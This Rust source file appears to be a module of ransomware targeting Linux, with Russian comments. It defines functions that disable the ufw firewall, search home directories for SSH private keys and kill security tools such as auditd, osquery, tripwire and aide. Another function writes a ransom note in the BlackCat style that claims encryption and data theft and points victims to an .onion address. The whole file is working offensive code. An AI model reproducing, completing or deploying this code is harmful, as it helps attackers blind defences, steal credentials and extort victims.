#[cfg(target_os = "linux")]
use std::process::Command;

pub struct LinuxOperations;

impl LinuxOperations {
    #[cfg(target_os = "linux")]
    pub fn disable_firewall() -> Result<(), String> {
        let output = Command::new("sudo")
            .args(&["systemctl", "stop", "ufw"])
            .output();

        match output {
            Ok(result) => {
                if result.status.success() {
                    Ok(())
                } else {
                    Err("Failed to disable firewall".to_string())
                }
            }
            Err(e) => Err(format!("Firewall disable failed: {}", e)),
        }
    }

    #[cfg(target_os = "linux")]
    pub fn enumerate_ssh_keys() -> Result<Vec<String>, String> {
        let output = Command::new("find")
            .args(&["/home", "-name", "id_rsa", "-o", "-name", "id_ed25519"])
            .output();

        match output {
            Ok(result) => {
                let stdout = String::from_utf8_lossy(&result.stdout);
                Ok(stdout.lines().map(|s| s.to_string()).collect())
            }
            Err(e) => Err(format!("SSH key enumeration failed: {}", e)),
        }
    }

    #[cfg(target_os = "linux")]
    pub fn kill_security_processes() -> Result<(), String> {
        let processes = vec!["aide", "tripwire", "osquery", "auditd"];
        
        for process in processes {
            let _ = Command::new("pkill")
                .args(&["-9", process])
                .output();
        }

        Ok(())
    }

    /// Создает записку с требованием выкупа в указанной директории (Linux-версия)
    #[cfg(target_os = "linux")]
    pub fn create_ransom_note(directory: &str) -> Result<(), String> {
        let ransom_content = format!(
r#"-->> Introduction
Important files on your system was ENCRYPTED and now they have have "sttp" extension.

In order to recover your files you need to follow instructions below.
Sensitive Data
Sensitive data on your system was DOWNLOADED and it will be PUBLISHED if you refuse to cooperate.
Data includes:
{}

CAUTION
DO NOT MODIFY FILES YOURSELF.

DO NOT USE THIRD PARTY SOFTWARE TO RESTORE YOUR DATA.

YOU MAY DAMAGE YOUR FILES, IT WILL RESULT IN PERMANENT DATA LOSS.

YOUR DATA IS STRONGLY ENCRYPTED, YOU CAN NOT DECRYPT IT WITHOUT CIPHER KEY.
Recovery procedure
Follow these simple steps to get in touch and recover your data:

Download and install Tor Browser from: https://torproject.org/
Navigate to:
http://blackcat-site.onion/?(ACCESS_KEY)"#,
            directory
        );

        let note_path = format!("{}/README_BLACKCAT.txt", directory);
        std::fs::write(&note_path, ransom_content)
            .map_err(|e| format!("Failed to create ransom note: {}", e))?;

        Ok(())
    }

    // Заглушки для компиляции на других ОС (чтобы main.rs не выдавал ошибок)
    #[cfg(not(target_os = "linux"))]
    pub fn disable_firewall() -> Result<(), String> {
        Err("Firewall disable only available on Linux".to_string())
    }

    #[cfg(not(target_os = "linux"))]
    pub fn enumerate_ssh_keys() -> Result<Vec<String>, String> {
        Err("SSH enumeration only available on Linux".to_string())
    }

    #[cfg(not(target_os = "linux"))]
    pub fn kill_security_processes() -> Result<(), String> {
        Err("Process killing only available on Linux".to_string())
    }

    #[cfg(not(target_os = "linux"))]
    pub fn create_ransom_note(_directory: &str) -> Result<(), String> {
        Err("Ransom note creation only available on Linux".to_string())
    }
}